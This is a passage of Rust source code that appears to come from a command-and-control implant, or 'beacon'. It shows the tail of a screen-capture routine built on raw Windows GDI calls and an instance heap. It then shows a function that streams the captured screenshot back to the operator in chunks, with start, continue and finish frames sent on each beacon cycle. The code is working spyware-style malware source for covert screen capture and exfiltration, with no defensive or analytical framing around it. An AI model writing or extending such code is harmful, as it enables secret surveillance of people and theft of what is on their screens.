        bmi.as_mut_ptr(),
        0, // DIB_RGB_COLORS
    );

    // Cleanup: every GDI object goes back before the result is decided.
    select_obj(hdc_mem, old);
    delete_obj(bmp);
    delete_dc(hdc_mem);
    release_dc(core::ptr::null(), hdc_screen);

    if scanlines != cy {
        heap.deallocate(buf);
        error(kernel32, id, results);
        return;
    }
    instance.screenshot = Some(ShotState {
        task_id: id,
        buf,
        len: total,
        cursor: 0,
        started: false,
    });
}

/// Stream the pending screenshot: START once, then one SHOT_CHUNK CONTINUE
/// per cycle, FINISH at the end. A failed push (body frame full - download
/// active) retries next cycle.
///
/// # Safety
///
/// Beacon thread; the buffer belongs to the instance heap.
pub unsafe fn screenshot_tick(instance: &mut Instance, w: &mut Writer) {
    let Some(shot) = instance.screenshot.as_mut() else {
        return;
    };
    if !shot.started {
        if !transport::push_screenshot_start(w, shot.task_id, shot.len as u64) {
            return;
        }
        shot.started = true;
    }
    let take = (shot.len - shot.cursor).min(SHOT_CHUNK);
    if take == 0 {
        return;
    }
    let chunk = core::slice::from_raw_parts(shot.buf.add(shot.cursor), take);
    if !transport::push_screenshot_continue(w, shot.task_id, chunk) {
        return; // body full — retry next cycle
    }
    shot.cursor += take;
    if shot.cursor == shot.len {
        let _ = transport::push_screenshot_finish(w, shot.task_id);
        let buf = shot.buf;
        if let Some(heap) = instance.heap {
            heap.deallocate(buf);
        }
        instance.screenshot = None;
    }
}
